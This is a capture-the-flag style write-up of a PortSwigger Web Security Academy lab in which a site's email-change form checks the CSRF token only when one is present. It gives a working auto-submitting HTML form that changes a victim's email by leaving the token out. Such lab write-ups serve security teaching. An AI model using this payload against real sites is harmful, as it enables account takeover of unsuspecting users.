# Lab Writeup: CSRF where token validation depends on token being present

URL: https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present

## Description

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

1. Login with `wiener:peter`
2. Try changing the email address, then intercept the request:

   ![csrf-token-dependant](/assets/csrf-token-dependant.png)

   From the above intercepted request and response, we know that the URL to change the email is `/my-account/change-email` with the method `POST` we could also see that a **CSRF token** is required to do the `POST` request

3. Create the following payload:

   ```html
   <!DOCTYPE html>
   <html>
     <body>
       <form
         action="https://0a8700c903b7eff4808580f2009c0028.web-security-academy.net/my-account/change-email"
         method="POST"
       >
         <!-- the only input value -->
         <input type="text" name="email" value="hacker@gmail.com" />
         <!-- notice that the csrf token value is not existant -->
       </form>
       <script type="text/javascript">
         // automatically upload form on open
         document.forms[0].submit();
       </script>
     </body>
   </html>
   ```

   From the above notice that the csrf token value and parameter is non existant in the form (usually `<input type="hidden" name="csrf" value="some_token" />`)

4. Store, deliver to victim, and the lab should be solved:

   ![csrf-token-dependant-1](/assets/csrf-token-dependant-1.png)
